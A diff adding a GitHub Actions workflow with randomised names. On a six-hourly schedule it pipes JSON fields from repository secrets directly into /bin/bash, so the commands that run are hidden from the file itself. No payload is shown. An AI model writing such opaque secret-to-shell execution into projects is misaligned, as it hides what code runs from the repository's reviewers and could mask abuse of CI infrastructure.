@@ -1,0 +1,19 @@
+name: workgongzuozhengli
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: workgongzuozhengli
+        env:
+          dty18552: ${{ secrets.dty18552 }}
+        run: |
+          echo $dty18552 | jq -r .shg3 | /bin/bash
+          echo $xlp987 | jq -r .hqpsi644 | /bin/bash
+          echo $uz6 | jq -r .f726 | /bin/bash
+          echo $jbnbf67374 | jq -r .atf7105 | /bin/bash
+
